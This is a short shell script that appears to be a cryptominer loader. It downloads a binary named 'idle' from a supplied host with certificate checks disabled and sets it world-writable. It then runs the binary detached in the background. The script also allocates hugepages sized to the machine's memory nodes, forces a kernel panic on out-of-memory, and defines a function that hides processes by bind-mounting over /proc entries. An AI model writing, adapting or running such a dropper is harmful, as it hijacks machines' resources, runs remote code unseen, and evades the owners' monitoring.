#!/bin/sh

mode="${1:-0}"
src="${2:-0}"
work="$(mktemp -u -t .XXXXXX 2>/dev/null)"
[ -n "${work}" ] || work="/tmp/.work"
mkdir -p "${work}"

hPid() {
  [ -d "/proc/$1" ] && [ ! -d "/tmp/.proc/$1" ] && mkdir -p "/tmp/.proc/$1" && mount -o bind "/tmp/.proc/$1" "/proc/$1" && return 0 || return 1
}

sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1
sysctl -w vm.nr_hugepages="$(awk '/^Mems_allowed_list:/{n=split($2,a,",");for(i=1;i<=n;i++){m=split(a[i],b,"-");c+=(m==1?1:b[2]-b[1]+1)}f=1;print c*1280;exit}END{if(!f)print 1280}' /proc/self/status)" >/dev/null 2>&1

wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
chmod -R 777 "${work}"

# hPid "$$"
nohup setsid /bin/sh -c 'cd "$1"; exec ./idle' /bin/sh "${work}" </dev/null >/dev/null 2>&1 &
# hPid "$!"
[ "$mode" != "0" ] && wait
exit 0
